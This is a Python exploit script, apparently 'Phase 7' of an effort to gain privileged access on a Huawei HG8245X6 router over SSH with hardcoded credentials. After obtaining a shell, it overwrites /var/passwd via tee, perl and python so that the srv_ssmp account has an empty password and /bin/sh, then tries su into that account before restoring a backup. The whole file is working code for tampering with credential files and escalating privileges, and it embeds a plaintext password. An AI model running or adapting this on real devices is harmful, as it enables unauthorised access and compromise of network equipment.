#!/usr/bin/env python3
"""
Phase 7: tee directly to /var/passwd (tee overwrites but > doesn't).
Also: exploit the fact that /etc/passwd is a symlink to /var/passwd,
and that su reads /etc/shadow which might not exist -> fallback to /etc/passwd!
"""

import paramiko
import time

HOST = "192.168.1.1"
USER = "sUser"
PASSWORD = "EP!99R4HLH9E"

def recv_until(chan, markers, timeout=10):
    if isinstance(markers, str):
        markers = [markers]
    buf = b""
    start = time.time()
    while time.time() - start < timeout:
        if chan.recv_ready():
            chunk = chan.recv(4096)
            buf += chunk
            decoded = buf.decode('utf-8', errors='replace')
            for marker in markers:
                if marker in decoded:
                    return decoded
        elif chan.exit_status_ready():
            break
        time.sleep(0.1)
    return buf.decode('utf-8', errors='replace')

def send_cmd(chan, cmd, marker="# ", timeout=20, show=True):
    chan.send(cmd + "\n")
    out = recv_until(chan, [marker, "WAP>", "SU_WAP>", "$ ", "Password:"], timeout)
    if show:
        lines = [l.strip() for l in out.strip().split('\n') if l.strip()]
        for l in lines:
            if cmd[:25] not in l:
                print(f"  {l}")
    return out

def connect_and_shell():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, username=USER, password=PASSWORD, timeout=10,
                   look_for_keys=False, allow_agent=False)
    chan = client.invoke_shell(width=220, height=50)
    time.sleep(2)
    out = recv_until(chan, ["WAP>", "Remove one session", "Enter the ID"], timeout=8)
    if "Remove one session" in out or "Enter the ID" in out:
        print("[!] Session limit - removing session 1...")
        chan.send("1\n")
        time.sleep(2)
        recv_until(chan, "WAP>", timeout=10)
    chan.send("su\n")
    recv_until(chan, ["SU_WAP>", "success"], timeout=8)
    chan.send("shell\n")
    recv_until(chan, "# ", timeout=8)
    print("[+] Shell obtained!\n")
    return client, chan

def main():
    print("=" * 62)
    print("  HG8245X6 - tee /var/passwd + shadow-bypass su")
    print("=" * 62)

    client, chan = connect_and_shell()

    # ── 1. Can tee write to /var/passwd directly? ─────────────
    print("[*] Testing tee write to /var/passwd:")
    # tee with -a appends; without -a it overwrites
    # First make a safe test: write our new_passwd content via tee
    send_cmd(chan, "ls -la /var/passwd /var/passwd_new 2>&1")

    print("\n[*] Using tee to overwrite /var/passwd with modified content:")
    send_cmd(chan, "cat /var/passwd_new | tee /var/passwd && echo TEE_WRITE_OK || echo TEE_WRITE_FAIL")
    send_cmd(chan, "grep srv_ssmp /var/passwd")

    # ── 2. Try su now ──────────────────────────────────────────
    print("\n[*] Attempting su srv_ssmp (empty passwd, /bin/sh):")
    chan.send("su srv_ssmp\n")
    out = recv_until(chan, ["Password", "# ", "$ ", "false"], timeout=5)
    print(f"  Result: {repr(out.strip()[-200:])}")
    
    success = False
    if "Password" in out:
        chan.send("\n")  # empty password
        out = recv_until(chan, ["# ", "$ ", "incorrect", "false", "WAP"], timeout=5)
        print(f"  After blank pwd: {repr(out.strip()[-200:])}")
        if "incorrect" not in out.lower() and "false" not in out.lower() and ("# " in out or "$ " in out):
            success = True
            print("\n  [+] ✓✓✓ SUCCESS! srv_ssmp SHELL OBTAINED! ✓✓✓")
    elif "# " in out or "$ " in out:
        success = True
        print("\n  [+] ✓✓✓ SUCCESS! No password needed! ✓✓✓")

    if success:
        send_cmd(chan, "id", timeout=5)
        send_cmd(chan, "whoami", timeout=5)
        send_cmd(chan, "cat /proc/self/status | grep -E 'Uid|Gid|Cap'", timeout=5)
        send_cmd(chan, "ls -la / 2>&1 | head -20", timeout=5)
    else:
        print("\n  [-] su failed, trying su -s /bin/sh srv_ssmp:")
        chan.send("su -s /bin/sh srv_ssmp\n")
        out = recv_until(chan, ["Password", "# ", "$ "], timeout=5)
        print(f"  {repr(out.strip()[-200:])}")
        if "Password" in out:
            chan.send("\n")
            out = recv_until(chan, ["# ", "$ ", "incorrect"], timeout=5)
            print(f"  {repr(out.strip())}")
            if "incorrect" not in out.lower() and ("# " in out or "$ " in out):
                print("  [+] ✓ SUCCESS with su -s!")
                send_cmd(chan, "id")

    # ── 3. Restore original passwd ────────────────────────────
    print("\n[*] Restoring /var/passwd from backup:")
    send_cmd(chan, "cat /tmp/passwd.bak | tee /var/passwd && echo RESTORED || echo RESTORE_FAIL")
    send_cmd(chan, "grep srv_ssmp /var/passwd")

    # ── 4. If tee write failed, try other approaches ──────────
    print("\n[*] Additional write attempts:")
    # Try perl (may be on device)
    send_cmd(chan, "perl -i -pe 's/srv_ssmp:x:3008/srv_ssmp::3008/; s|srv_ssmp:/bin/false|srv_ssmp:/bin/sh|' /var/passwd 2>&1 && echo PERL_OK || echo PERL_FAIL", timeout=10)
    # Try python
    send_cmd(chan, "python -c \"import os; data=open('/var/passwd').read(); data=data.replace('srv_ssmp:x:3008','srv_ssmp::3008').replace('srv_ssmp:/bin/false','srv_ssmp:/bin/sh'); open('/var/passwd','w').write(data)\" 2>&1 && echo PY_OK || echo PY_FAIL", timeout=10)
    send_cmd(chan, "grep srv_ssmp /var/passwd")

    if "PY_OK" in send_cmd(chan, "echo check", show=False):
        pass
    # Try su again after python modification
    print("\n[*] Try su after python modification:")
    chan.send("su srv_ssmp\n")
    out = recv_until(chan, ["Password", "# ", "$ "], timeout=5)
    if "Password" in out:
        chan.send("\n")
        out = recv_until(chan, ["# ", "$ ", "incorrect"], timeout=5)
        if "incorrect" not in out.lower() and ("# " in out or "$ " in out):
            print("  [+] ✓✓✓ PYTHON PATCH WORKED! srv_ssmp!")
            send_cmd(chan, "id")
        else:
            print(f"  [-] {out.strip()}")
    
    # Final restore
    send_cmd(chan, "cat /tmp/passwd.bak | tee /var/passwd 2>/dev/null; echo FINAL_RESTORE")

    client.close()
    print("\n[*] Session closed.")

if __name__ == "__main__":
    main()
